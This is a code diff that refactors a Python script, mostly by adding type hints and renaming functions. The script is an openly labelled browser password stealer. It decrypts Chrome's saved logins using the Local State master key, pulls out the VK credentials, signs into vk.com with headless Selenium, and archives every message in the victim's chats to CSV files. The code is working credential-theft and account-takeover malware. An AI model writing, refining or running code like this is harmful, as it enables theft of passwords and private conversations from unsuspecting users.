@@ -16,7 +16,7 @@ from selenium.webdriver.common.by import By
 from webdriver_manager.chrome import ChromeDriverManager
 
 
-def get_master_key():
+def get_master_key()->tuple:
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
@@ -30,11 +30,11 @@ def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
 
-def generate_cipher(aes_key, iv):
+def generate_cipher(aes_key:tuple, iv:list):
     return AES.new(aes_key, AES.MODE_GCM, iv)
 
 
-def decrypt_password(buff, master_key):
+def decrypt_password(buff:list, master_key:tuple)->str:
     try:
         iv = buff[3:15]
         payload = buff[15:]
@@ -48,7 +48,7 @@ def decrypt_password(buff, master_key):
         return "Chrome < 80"
 
 
-def stiller_chrome():
+def stealler_chrome()->dict:
     master_key = get_master_key()
     data = {}
     if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
@@ -65,15 +65,14 @@ def stiller_chrome():
                 data[url] = (user_name, pwd)
     return data
 
-
-def create_driver():
+def create_driver()->webdriver:
     options = webdriver.ChromeOptions()
     options.add_argument('--headless')
     service = Service(ChromeDriverManager().install())
     return webdriver.Chrome(options=options, service=service)
 
 
-def put_field(driver, teg, data, put):
+def insert_into_field(driver:webdriver, teg, data:str, put:str):
     inp = driver.find_element(teg, data)
     inp.clear()
     inp.send_keys(put)
@@ -85,14 +84,14 @@ def click_field(driver, teg, data):
 
 
 def logging(driver, number, password):
-    put_field(driver, By.ID, "index_email", number)
+    insert_into_field(driver, By.ID, "index_email", number)
     click_field(driver, By.CLASS_NAME, "FlatButton--primary")
     click_field(driver, By.CSS_SELECTOR, "button.vkc__Bottom__switchToPassword")
-    put_field(driver, By.NAME, "password", password)
+    insert_into_field(driver, By.NAME, "password", password)
     click_field(driver, By.CLASS_NAME, "vkuiButton--lvl-primary")
 
 
-def authorization(url: str, number: str, password: str):
+def authorization(url: str, number: str, password: str)->tuple:
     #Создание сессии драйвера и авторизация на сайте
     driver = create_driver()
     driver.get(url)
@@ -102,7 +101,7 @@ def authorization(url: str, number: str, password: str):
     driver.save_screenshot("auth_done.png")
     uid = driver.execute_script("return window.vk.id;")
 
-    return driver, uid
+    return (driver, uid)
 
 
 def parse_page(response):
@@ -120,7 +119,7 @@ def parse_page(response):
     return peer_ids, minor_sort_id, has_more
 
 
-def parse_list_id(session):
+def parse_list_id(session)->list:
     list_id = []
     last_msg_id = 0
     has_more = True
@@ -142,7 +141,7 @@ def parse_list_id(session):
     return list_id
 
 
-def parse_message_data(req, uid):
+def parse_message_data(req, uid)->tuple:
     req_text = req.text
     json_str = json.loads(req_text[4:])
     payload = json_str['payload']
@@ -173,7 +172,7 @@ def parse_message_data(req, uid):
     return type_chat, times, list_msg_id, messages, True, length
 
 
-def parse_message(session, uid, chat_id):
+def parse_message(session:requests, uid:str, chat_id:str)->tuple:
     type_chat = ''
     list_messages, list_ids, list_times = [], [], []
     has_more = True
@@ -224,27 +223,10 @@ def get_data(auth_driver, uid, some=None):
         print(' Содержимое чата id = ', chat_id, '\tуспешно сохранено')
     return
 
-
 if __name__ == '__main__':
-    '''
-    --------------------------------------vk api не используется-----------------------------------------
-    Этот код собирает сохранённые данные логинов и паролей и использует для авторизации в ВК.
-    Далее, берёт headers и cookies из драйвера selenium для POST запросов.
-    Далее, обработка response как json объект и извлечение необходимых данных.
-    Далее, композиция данных в data frame и сохранение в папке.
-    Данные - все сообщения каждого чата юзера.
-    
-    Описание полученных data frame:
-    В папке Archive_'user_id' хранятся csv-файлы в формате:
-        Status_Chat + Id_Chat + .csv
-        Где Status_Chat может быть Pesonaly или Group в зависимости от типа чата (личка, беседа)
-        Id_Chat - id чата 
-        В самом файле содержатся информация сообщений чата. (Id отправителя, текст, время)
-    '''
-
     # Стиллер сохранённых паролей браузера
     print('Получение данных...')
-    data_hack = stiller_chrome()
+    data_hack = stealler_chrome()
     login, psw = data_hack['https://id.vk.com/auth']
     print('Логин и пароль успешно получены' + '\n',
           'Логин:', login + '\n',
@@ -252,7 +234,7 @@ if __name__ == '__main__':
 
     # Авторизация с пременением парсинга
     print('Авторизация...')
-    vk_driver, user_id = authorization("https://vk.com/login", login, psw)
+    (vk_driver, user_id) = authorization("https://vk.com/login", login, psw)
     print('Авторизация прошла успешно' + '\n',
           'id пользователя = ', user_id)
 
